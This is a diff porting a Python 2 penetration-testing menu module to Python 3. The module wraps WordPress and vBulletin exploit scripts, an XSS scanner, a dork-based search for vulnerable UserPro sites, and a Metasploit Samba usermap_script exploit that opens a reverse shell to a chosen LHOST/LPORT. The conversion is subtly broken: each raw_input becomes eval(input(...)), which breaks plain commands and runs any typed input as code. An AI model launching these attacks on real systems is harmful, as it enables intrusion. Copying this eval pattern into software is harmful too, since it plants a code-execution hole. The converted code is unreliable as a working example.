@@ -2,13 +2,13 @@
 
 import os, sys, subprocess, bs4,signal,requests
 import core
-from urllib2 import quote
+from urllib.parse import quote
 from socket import timeout
-from urllib2 import urlopen
-from urllib2 import Request
+from urllib.request import urlopen
+from urllib.request import Request
 import readline, rlcompleter
 from sys import argv
-from commands import *
+from subprocess import *
 from core import help
 
 
@@ -23,21 +23,21 @@ def clean():
 
 def wordpress_scan():
     while True:
-        sec = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners"+N+"): ")
+        sec = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners"+N+"): "))
         if sec == 'show options':
             help.option()
             wordpress_scan()
         elif sec =='back':
             core.menu.post()
         elif sec =='set target':
-            wop = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners "+G+"(target)"+N+"): ")
-            enum = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners "+G+"(user)"+N+"): ")
-            uiop = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners"+N+"): ")
+            wop = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners "+G+"(target)"+N+"): "))
+            enum = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners "+G+"(user)"+N+"): "))
+            uiop = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners"+N+"): "))
             if uiop == "run":
-                print ""+B+"[*]"+N+" Starting attacks..."
+                print((""+B+"[*]"+N+" Starting attacks..."))
                 os.system("cd modules;cd wscan;python wpscanner.py -s %s -n %s" % (wop,enum))
-                print ""+B+"[*]"+N+" Job finished!"
-                print
+                print((""+B+"[*]"+N+" Job finished!"))
+                print()
                 wordpress_scan()
             else:
                 wordpress_scan()
@@ -45,18 +45,18 @@ def wordpress_scan():
             clean()
             wordpress_scan()
         elif sec =='exit':
-             print
-             print""+G+"Thanks for using PTF"
-             print
+             print()
+             print((""+G+"Thanks for using PTF"))
+             print()
              exit()
         else:
-            print "Wrong Command => ", sec
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", sec))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             wordpress_scan()
         pass
 def dirse():
     while True:
-        dir = raw_input("Pentest>> ("+B+"modules/post)("+R+"post/dir_search"+N+"): ")
+        dir = eval(input("Pentest>> ("+B+"modules/post)("+R+"post/dir_search"+N+"): "))
         if dir == 'show options':
            help.option()
            dirse()
@@ -64,14 +64,14 @@ def dirse():
             core.menu.post()
 
         elif dir == 'set target':
-            ym = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/dir_search "+G+"(set target)"+N+"): ")
-            print "target => "+R+"",ym
-            puki = raw_input("Pentest>> ("+B+"modules/post)("+R+"post/dir_search "+G+"(set extensions)"+N+"): ")
-            dih = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/dir_search"+N+"): ")
+            ym = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/dir_search "+G+"(set target)"+N+"): "))
+            print(("target => "+R+"",ym))
+            puki = eval(input("Pentest>> ("+B+"modules/post)("+R+"post/dir_search "+G+"(set extensions)"+N+"): "))
+            dih = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/dir_search"+N+"): "))
             if dih == "run":
                 os.system("python mpdules/dirsearch/dirsearch.py -u %s -e %s" % (ym,puki))
-                print ""+B+"[*]"+N+" Job finished!"
-                print
+                print((""+B+"[*]"+N+" Job finished!"))
+                print()
                 dirse()
             else:
                 dirse()
@@ -79,30 +79,30 @@ def dirse():
             clean()
             dirse()
         elif dir =='exit':
-             print
-             print""+G+"Thanks for using PXXTF"
-             print
+             print()
+             print((""+G+"Thanks for using PXXTF"))
+             print()
              exit()
         else:
-            print "Wrong Command => ", dir
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", dir))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             dirse()
         pass
 def xss():
     while True:
-        cs = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war "+N+"): ")
+        cs = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war "+N+"): "))
         if cs == 'show options':
             help.option()
             xss()
         elif cs == 'set target':
-            tops = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war "+G+"(set target)"+N+"): ")
-            print "target =>"+R+"" ,tops
-            gay = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war"+N+"): ")
+            tops = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war "+G+"(set target)"+N+"): "))
+            print(("target =>"+R+"" ,tops))
+            gay = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war"+N+"): "))
             if gay == "run":
-                print ""+B+"[*]"+N+" Starting attacks Scanning..."
+                print((""+B+"[*]"+N+" Starting attacks Scanning..."))
                 os.system("cd modules;cd xsspy;python XssPy.py -u %s -v" % (tops))
-                print ""+B+"[*]"+N+" Job finished!"
-                print
+                print((""+B+"[*]"+N+" Job finished!"))
+                print()
                 xss()
             else:
                 xss()
@@ -112,23 +112,23 @@ def xss():
             clean()
             xss()
         elif cs =='exit':
-             print
-             print""+G+"Thanks for using PTF"
-             print
+             print()
+             print((""+G+"Thanks for using PTF"))
+             print()
              exit()
         else:
-            print "Wrong Command => ", cs
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", cs))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             xss()
         pass
 def wordpress():
     while True:
-        wor = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find"+N+"): ")
+        wor = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find"+N+"): "))
         if wor == 'show options':
-            print "Name                  Description"
-            print "=====                ============="
-            print "set target           start target"
-            print "back                 back to menu"
+            print("Name                  Description")
+            print("=====                =============")
+            print("set target           start target")
+            print("back                 back to menu")
             wordpress()
         elif wor == 'back':
             core.menu.post()
@@ -155,7 +155,7 @@ def wordpress():
                      if (len(allResults) == 0):
                          return(""+R+"[!] "+N+"No result found for this keyword => " + keywords)
                      else:
-                         print(""+B+"[*]"+N+" Ok! Starting... \n")
+                         print((""+B+"[*]"+N+" Ok! Starting... \n"))
 
                          for element in allResults:  # Prints all the results
                              if (element.startswith("http://")):
@@ -166,7 +166,7 @@ def wordpress():
                                  element = element[4:]
                              element=element[:element.find("/")]
                              element="http://"+element
-                             print("checking "+element+" :")
+                             print(("checking "+element+" :"))
                              if (checkwp(element)):
                                  suc = str(checkVul(element))
                                  if( suc=="True"):
@@ -175,13 +175,13 @@ def wordpress():
                                          filee.write(element+"\n")
                                          filee.close()
                                      except:
-                                         print(""+R+"error"+N+"")
+                                         print((""+R+"error"+N+""))
                                      print (suc)
                                  else:
-                                     print (""+R+"False"+N+"")
+                                     print((""+R+"False"+N+""))
 
                              else:
-                                print (element + ""+R+" =>"+N+" " + str(checkwp(element)))
+                                print((element + ""+R+" =>"+N+" " + str(checkwp(element))))
 
 
              def checkwp(url):
@@ -191,7 +191,7 @@ def wordpress():
                  except:
                      return False
                  if (pURL.find(".userpro")>-1):
-                     print (""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n")
+                     print((""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n"))
                      return True
                  else:
                      return False
@@ -207,24 +207,24 @@ def wordpress():
                  except:
                      return False
              while(True):
-                 x = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (set Dork)"+N+"): ")
-                 print "DORKS => "+R+"",x
-                 n= raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (start number)"+N+"): ")
-                 print "START NUMBER => "+R+"",n
-                 g= raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (set end_number)"+N+"): ")
-                 print "END NUMBER => "+R+"",g
-                 run = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find"+N+"): ")
+                 x = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (set Dork)"+N+"): "))
+                 print(("DORKS => "+R+"",x))
+                 n= eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (start number)"+N+"): "))
+                 print(("START NUMBER => "+R+"",n))
+                 g= eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (set end_number)"+N+"): "))
+                 print(("END NUMBER => "+R+"",g))
+                 run = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find"+N+"): "))
                  if run == "run":
-                    print ""+B+"[*] "+N+"Starting attacks..."
+                    print((""+B+"[*] "+N+"Starting attacks..."))
                  while(True):
                      tracker(x, n)
-                     y=raw_input(""+B+"[*]"+N+" Next (y/n)?")
+                     y=eval(input(""+B+"[*]"+N+" Next (y/n)?"))
                      if(y=="y"):
                          n+=g;
                          tracker(x, n)
                      else:
                          core.menu.scan()
-                 y1=raw_input(""+B+"[*]"+N+" Anouther dork (y/n) ?")
+                 y1=eval(input(""+B+"[*]"+N+" Anouther dork (y/n) ?"))
                  if (y1 == "y"):
                      continue
                  else:
@@ -233,26 +233,26 @@ def wordpress():
             clean()
             wordpress()
         elif wor =='exit':
-             print
-             print""+G+"Thanks for using PTF"
-             print
+             print()
+             print((""+G+"Thanks for using PTF"))
+             print()
              exit()
 
         else:
-            print "Wrong Command => ", wor
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", wor))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             wordpress()
         pass
 def android():
     while True:
-        dd = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/android_remote_acces"+N+"): ")
+        dd = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/android_remote_acces"+N+"): "))
         if dd == 'show options':
             help.option()
             android()
         elif dd =='exit':
-             print
-             print""+G+"Thanks for using PTF"
-             print
+             print()
+             print((""+G+"Thanks for using PTF"))
+             print()
              exit()
         elif dd == "back":
             core.menu.post()
@@ -263,27 +263,27 @@ def android():
             clean()
             android()
         else:
-            print "Wrong Command => ", dd
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", dd))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             android()
 def vb():
    while True:
-       list = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin"+N+"): ")
+       list = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin"+N+"): "))
        if list == 'show options':
            help.option()
            vb()
        elif list =='exit':
-            print
-            print""+G+"Thanks for using PTF"
-            print
+            print()
+            print((""+G+"Thanks for using PTF"))
+            print()
             exit()
        elif list == "back":
             core.menu.post()
 
        elif list == 'set target':
-            go = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin (vbulletin$)"+N+"): ")
-            print "target =>"+R+"",go
-            se = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin (vbulletin$)"+N+"): ")
+            go = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin (vbulletin$)"+N+"): "))
+            print(("target =>"+R+"",go))
+            se = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin (vbulletin$)"+N+"): "))
             if se == "run":
                 os.system('python modules/vbulletin/vb.py %s' % (go))
                 vb()
@@ -293,34 +293,34 @@ def vb():
             clean()
             vb()
        else:
-           print "Wrong Command => ", list
-           print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+           print(("Wrong Command => ", list))
+           print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            vb()
 def num():
    while True:
-       list = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration"+N+"): ")
+       list = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration"+N+"): "))
        if list == 'show options':
            help.option()
            num()
        elif list =='exit':
-            print
-            print""+G+"Thanks for using PTF"
-            print
+            print()
+            print((""+G+"Thanks for using PTF"))
+            print()
             exit()
        elif list == "back":
             core.menu.post()
 
        elif list == 'set target':
-            go = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration "+G+"(set target IP/domain)"+N+"): ")
-            print
-            print '  command                Descriptions '
-            print ' ---------             ----------------'
-            print " target =>"+R+"",go
-            print ' --------------------------------------'
-            print ' run                     Start attack'
-            print ' back                    back '
-            print
-            se = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration "+G+"(set target IP/domain)"+N+"): ")
+            go = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration "+G+"(set target IP/domain)"+N+"): "))
+            print()
+            print('  command                Descriptions ')
+            print(' ---------             ----------------')
+            print((" target =>"+R+"",go))
+            print(' --------------------------------------')
+            print(' run                     Start attack')
+            print(' back                    back ')
+            print()
+            se = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration "+G+"(set target IP/domain)"+N+"): "))
             if se == "run":
                 os.system('python modules/enum/http-enum.py -t %s' % (go))
                 num()
@@ -330,52 +330,52 @@ def num():
             clean()
             num()
        else:
-           print "Wrong Command => ", list
-           print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+           print(("Wrong Command => ", list))
+           print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            num()
 def smb():
     while True:
-        map =raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba"+N+"): ")
+        map =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba"+N+"): "))
         if map == 'show options':
             help.option()
             smb()
         elif map =='exit':
-             print
-             print""+G+"Thanks for using PTF"
-             print
+             print()
+             print((""+G+"Thanks for using PTF"))
+             print()
              exit()
         elif map == 'back':
             core.menu.postex()
         elif map =='set target':
-             rhost =raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set RHOST)"+N+"): ")
-             print "RHOST =>",rhost
-             rport =raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set RPORT)"+N+"): ")
-             print "RPORT =>",rport
-             lhost =raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set LHOST)"+N+"): ")
-             print 'LHOST =>',lhost
-             lport =raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set LPORT)"+N+"): ")
-             print 'LPORT =>',lport
-             her =raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+N+"): ")
+             rhost =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set RHOST)"+N+"): "))
+             print(("RHOST =>",rhost))
+             rport =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set RPORT)"+N+"): "))
+             print(("RPORT =>",rport))
+             lhost =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set LHOST)"+N+"): "))
+             print(('LHOST =>',lhost))
+             lport =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set LPORT)"+N+"): "))
+             print(('LPORT =>',lport))
+             her =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+N+"): "))
              if her =='run':
                 os.system('msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOST %s ; set RPORT %s ; set payload cmd/unix/reverse ; set LHOST %s ; set LPORT %s ; run "' % (rhost, rport, lhost, lport))
-                print
+                print()
                 smb()
         elif map =='clear':
             clean()
             smb()
         else:
-            print "Wrong Command => ", map
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", map))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             smb()
 def aix_hashdump():
     while True:
-        cs = raw_input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/aix_hashdump "+N+"): ")
+        cs = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/aix_hashdump "+N+"): "))
         if cs == 'show options':
             help.option()
             aix_hashdump()
         elif cs == 'set target':
              os.system('msfconsole -q -x "use use post/aix/hashdump; show options" ')
-             print
+             print()
              aix_hashdump()
         elif cs =='back':
             core.menu.post()
@@ -383,12 +383,12 @@ def aix_hashdump():
             clean()
             aix_hashdump()
         elif cs =='exit':
-             print
-             print""+G+"Thanks for using PTF"
-             print
+             print()
+             print((""+G+"Thanks for using PTF"))
+             print()
              exit()
         else:
-            print "Wrong Command => ", cs
-            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
+            print(("Wrong Command => ", cs))
+            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
             aix_hashdump()
         pass
